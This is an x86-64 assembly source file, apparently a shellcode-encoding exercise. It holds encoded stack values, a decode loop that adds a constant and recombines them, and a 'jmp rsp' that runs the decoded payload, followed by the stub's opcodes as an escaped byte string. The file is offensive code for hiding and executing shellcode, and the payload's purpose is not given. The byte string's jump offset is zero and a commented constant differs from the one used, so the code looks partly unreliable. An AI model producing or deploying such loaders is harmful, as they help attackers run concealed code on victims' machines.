BITS 64

global main

section .text

main:
    ; push shellcode
    ; encoded shellcode
    push 0x57d7e3e
    push 0x57dc01f

    push 0x7835e41f
    push 0x2b56501d

    push 0x25601d1d
    push 0x6d4c4241

    push 0x4cf1fd29
    push 0x4d7d7e7e

    ; reset rcx
    xor rcx, rcx
    ; save rsp for shellcode jump
    mov rbx, rsp
    ; save rsp for shellcode decode
    mov rsi, rsp
    ; index
    mov cl, 0x4

decode_shellcode:
    ; decrement
    dec cl

    ; upper
    ; move shellcode to register
    mov rdx, [rsi]
    ; decrement for the next instruction
    add rsi, 0x8

    ; decode
    add rdx, 0x43131212;0x42121212
    ; end upper
    shl rdx, 30
    shl rdx, 2

    ; lower
    ; add shellcode to register
    add rdx, [rsi]
    ; decrement for the next instruction
    add rsi, 0x8

    ; decode
    add rdx, 0x43131212;0x42121212

    ; move shellcode decoded
    push rdx
    ; check index
    test cl, cl
    ; loop
    jne decode_shellcode
    ; jump to the shellcode
    jmp rsp

; "\x68\x3E\x7E\x7D\x05\x68\x1F\xC0\x7D\x05\x68\x1F\xE4\x35\x78\x68\x1D\x50\x56\x2B\x68\x1D\x1D\x60\x25\x68\x41\x42\x4C\x6D\x68\x29\xFD\xF1\x4C\x68\x7E\x7E\x7D\x4D\x48\x89\xE3\x48\x89\xE6\xB1\x04\xFE\xC9\x48\x8B\x16\x48\x83\xC6\x08\x48\xC1\xE2\x1E\x48\xC1\xE2\x02\x48\x03\x16\x48\x83\xC6\x08\x52\x84\xC9\x0F\x85\x00\x00\x00\x00\xFF\xE4"
